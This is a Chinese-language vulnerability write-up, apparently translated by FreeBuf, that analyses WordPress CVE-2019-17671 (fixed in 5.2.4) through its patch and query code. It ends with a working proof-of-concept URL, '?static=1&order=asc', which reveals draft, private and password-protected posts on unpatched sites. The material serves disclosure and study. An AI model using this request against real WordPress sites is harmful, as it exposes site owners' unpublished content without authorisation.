![](https://image.3001.net/images/20191102/1572700436_5dbd81145ed6d.jpg!small)

**近期，WordPress发布了最新的v5.2.4版本，并修复了很多安全漏洞。在这篇文章中，我们将对其中的一个漏洞CVE-2019-17671进行分析。**

##  信息收集

该漏洞由安全专家J.D.Grimes发现并上报，并且披露了如何利用该漏洞查看未授权文章的方法。但是目前我还找不到任何相关的PoC，因此首先我们需要尽可能地收集关于该漏洞的信息。首先，我查看了不同安全厂商关于该漏洞的声明，大部分厂商都引用了相同的一句话：“该漏洞也许可以允许他人查看WordPress中未授权的文章”。

###  参考资料

>
> 1、<https://blog.wpscan.org/wordpress/security/release/2019/10/15/wordpress-524-security-> release-breakdown.html>
>
> 2、<https://blog.wpsec.com/wordpress-5-2-4-security-release/>
>
>
> 3、<https://www.reddit.com/r/netsec/comments/di9kf2/wordpress_524_security_release_breakdown/f3vbuyh/>

根据收集到的信息，我在WordPress的SVN仓库/GitHub库中，找到了5.2-branch分支，点击最近的commit，然后查看提到了“unauthenticated
posts”或者“viewing
posts”的相关commit。此时，我找到了一个相关的commit：[f82ed753cf00329a5e41f2cb6dc521085136f308](https://github.com/WordPress/WordPress/commit/f82ed753cf00329a5e41f2cb6dc521085136f308)。

##  补丁分析

这一个commit只修改了两行代码，删除了static关键字，并修改了部分if条件语句：

![](https://image.3001.net/images/20191102/1572700445_5dbd811ddf3fc.png!small)

根据我的猜想，被删除的static关键字跟这个漏洞有着直接的关系。wp-includes/class-wp-query.php的第731行代码开始包含parse_query函数了，而该函数可以过滤并解析传入的所有查询参数（$_GET）。

从第696行到第922行的代码可以根据给定的参数来设置$this->is_single、$this->is_attachment以及$this->is_page。这些条件分支都基于else
if实现，但其中只有一个比较关键：

    
    
    // If year, month, day, hour, minute, and second are set, a single
    
        // post is being queried.
    
        } elseif ( '' != $qv['static'] || '' != $qv['pagename'] || ! empty( $qv['page_id'] ) ) {
    
        $this->is_page   = true;
    
        $this->is_single = false;
    
        } else {
    
        // Look for archive queries. Dates, categories, authors, search, post type archives.

我们肯定不是想设置attachment、name、p或者hour之类的参数，因为这些参数可以绕过代码中的条件分支。但是我们又不能直接设置pagename或page_id，因为我们并不知道这些参数的值，而且些参数将可能导致访问控制检查失效。

这里，我们需要在参数列表中使用static=1。研究了半天之后，我找到了get_posts()函数，而这个函数可以使用已解析的参数来查询数据库内容：

    
    
    public function get_posts() {
    
        global $wpdb;
    
        $this->parse_query();
    
        [..]

在多个位置使用var_dump调试后，我找到了下列代码：

    
    
    // Check post status to determine if post should be displayed.
    
                if ( ! empty( $this->posts ) && ( $this->is_single || $this->is_page ) ) {
    
                    $status = get_post_status( $this->posts[0] );
    
                    if ( 'attachment' === $this->posts[0]->post_type && 0 === (int) $this->posts[0]->post_parent ) {
    
                        $this->is_page       = false;
    
                        $this->is_single     = true;
    
                        $this->is_attachment = true;
    
                    }
    
                    $post_status_obj = get_post_status_object( $status );
    
                    //PoC: Let's see what we have
    
                    //var_dump($q_status);
    
                    //var_dump($post_status_obj);
    
                    // If the post_status was specifically requested, let it pass through.
    
                    if ( ! $post_status_obj->public && ! in_array( $status, $q_status ) ) {
    
                        //var_dump("PoC: Incorrect status! :-/");
    
                        if ( ! is_user_logged_in() ) {
    
                            // User must be logged in to view unpublished posts.
    
                            $this->posts = array();
    
                            //var_dump("PoC: No posts :-(");
    
                        } else {
    
                            if ( $post_status_obj->protected ) {
    
                                // User must have edit permissions on the draft to preview.
    
                                if ( ! current_user_can( $edit_cap, $this->posts[0]->ID ) ) {
    
                                    $this->posts = array();
    
                                } else {
    
                                    $this->is_preview = true;
    
                                    if ( 'future' != $status ) {
    
                                        $this->posts[0]->post_date = current_time( 'mysql' );
    
                                    }
    
                                }
    
                            } elseif ( $post_status_obj->private ) {
    
                                if ( ! current_user_can( $read_cap, $this->posts[0]->ID ) ) {
    
                                    $this->posts = array();
    
                                }
    
                            } else {
    
                                $this->posts = array();
    
                            }
    
                        }
    
                    }

除了static=1之外，我们并没有设置其他特定的查询参数，我们在$this->posts =
$wpdb->get_results($this->request);语句之前插入var_dump($this->request);，输出的结果如下：

    
    
    string(112) "SELECT   wp_posts.* FROM wp_posts  WHERE 1=1  AND wp_posts.post_type = 'page'  ORDER BY wp_posts.post_date DESC "

该语句可以返回数据库中的所有页面，包括password protected、pending及drafts类别的页面。因此，! empty(
$this->posts ) && ( $this->is_single || $this->is_page )对应的值为true。

接下来，该函数会检查第一篇文章的状态“$status = get_post_status( $this->posts[0] );”：

    
    
    if ( ! $post_status_obj->public && ! in_array( $status, $q_status ) ) {

如果第一篇文章的状态不是public，则将进一步执行访问控制检查。比如，当用户未经授权时，代码将会清空$this->posts。

##  漏洞利用

利用该漏洞的方法也非常简单，首先我们可以控制查询流程，使第一篇文章的状态为published，但返回数组中包含多篇文章。

我们首先需要创建一些测试页面：即一个处于已发布状态的页面和一个处于草稿状态的页面。

这里我使用的是页面，因为post_type='page'是WordPress的默认设置，但如果有需要，我们可以设置&post_type=post，这样就能修改文章类型，变成post_type
= 'post'。

![](https://image.3001.net/images/20191102/1572700486_5dbd81469e501.png!small)

目前我们知道，如果在WordPress的URL添加?static=1，即可以查看到网站的隐私内容。在访问控制检查代码的前面插入var_dump($this->posts);，可以看到<http://wordpress.local/?static=1>这个URL会返回如下内容：

    
    
    array(2) {
    
          [0]=>
    
          object(WP_Post)#763 (24) {
    
            ["ID"]=>
    
            int(43)
    
            ["post_author"]=>
    
            string(1) "1"
    
            ["post_date"]=>
    
            string(19) "2019-10-20 03:55:29"
    
            ["post_date_gmt"]=>
    
            string(19) "0000-00-00 00:00:00"
    
            ["post_content"]=>
    
            string(79) "<!-- wp:paragraph -->
    
        <p>A draft with secret content</p>
    
        <!-- /wp:paragraph -->"
    
            ["post_title"]=>
    
            string(7) "A draft"
    
            ["post_excerpt"]=>
    
            string(0) ""
    
            ["post_status"]=>
    
            string(5) "draft"
    
            ["comment_status"]=>
    
            string(6) "closed"
    
            ["ping_status"]=>
    
            string(6) "closed"
    
            ["post_password"]=>
    
            string(0) ""
    
            ["post_name"]=>
    
            string(0) ""
    
            ["to_ping"]=>
    
            string(0) ""
    
            ["pinged"]=>
    
            string(0) ""
    
            ["post_modified"]=>
    
            string(19) "2019-10-20 03:55:29"
    
            ["post_modified_gmt"]=>
    
            string(19) "2019-10-20 03:55:29"
    
            ["post_content_filtered"]=>
    
            string(0) ""
    
            ["post_parent"]=>
    
            int(0)
    
            ["guid"]=>
    
            string(34) "<http://wordpress.local/?page_id=43>"
    
            ["menu_order"]=>
    
            int(0)
    
            ["post_type"]=>
    
            string(4) "page"
    
            ["post_mime_type"]=>
    
            string(0) ""
    
            ["comment_count"]=>
    
            string(1) "0"
    
            ["filter"]=>
    
            string(3) "raw"
    
          }
    
          [1]=>
    
          object(WP_Post)#764 (24) {
    
            ["ID"]=>
    
            int(41)
    
            ["post_author"]=>
    
            string(1) "1"
    
            ["post_date"]=>
    
            string(19) "2019-10-20 03:54:50"
    
            ["post_date_gmt"]=>
    
            string(19) "2019-10-20 03:54:50"
    
            ["post_content"]=>
    
            string(66) "<!-- wp:paragraph -->
    
        <p>Public content</p>
    
        <!-- /wp:paragraph -->"
    
            ["post_title"]=>
    
            string(13) "A public page"
    
            ["post_excerpt"]=>
    
            string(0) ""
    
            ["post_status"]=>
    
            string(7) "publish"
    
            ["comment_status"]=>
    
            string(6) "closed"
    
            ["ping_status"]=>
    
            string(6) "closed"
    
            ["post_password"]=>
    
            string(0) ""
    
            ["post_name"]=>
    
            string(13) "a-public-page"
    
            ["to_ping"]=>
    
            string(0) ""
    
            ["pinged"]=>
    
            string(0) ""
    
            ["post_modified"]=>
    
            string(19) "2019-10-20 03:55:10"
    
            ["post_modified_gmt"]=>
    
            string(19) "2019-10-20 03:55:10"
    
            ["post_content_filtered"]=>
    
            string(0) ""
    
            ["post_parent"]=>
    
            int(0)
    
            ["guid"]=>
    
            string(34) "<http://wordpress.local/?page_id=41>"
    
            ["menu_order"]=>
    
            int(0)
    
            ["post_type"]=>
    
            string(4) "page"
    
            ["post_mime_type"]=>
    
            string(0) ""
    
            ["comment_count"]=>
    
            string(1) "0"
    
            ["filter"]=>
    
            string(3) "raw"
    
          }
    
        }

大家可以看到，数组中的第一个页面为草稿(["post_status"]=>string(5) "draft")，因此页面是没有内容的：

![](https://image.3001.net/images/20191102/1572700499_5dbd8153664da.png!small)

但是，我们可以使用其他的方法来控制返回的内容：

> 1、order with asc or desc
>
> 2、orderby
>
> 3、m with m=YYYY, m=YYYYMM or m=YYYYMMDD date format
>
> 4、...

在这种场景下，我们只需要颠倒返回元素的顺序即可实现漏洞利用。

接下来，访问[http://wordpress.local/?static=1ℴ=asc](http://wordpress.local/?static=1&order=asc)，我们就可以查看到隐私内容了：

![](https://image.3001.net/images/20191102/1572700507_5dbd815b6dcd2.png!small)

除此之外，我们还可以利用该漏洞查看password protected以及private状态的文章：

![](https://image.3001.net/images/20191102/1572700513_5dbd81613e8fa.png!small)

 *** 参考来源：[0day](https://0day.work/proof-of-concept-for-wordpress-5-2-3-viewing-unauthenticated-posts/)，FB小编Alpha_h4ck编译，转载请注明来自FreeBuf.COM**

  

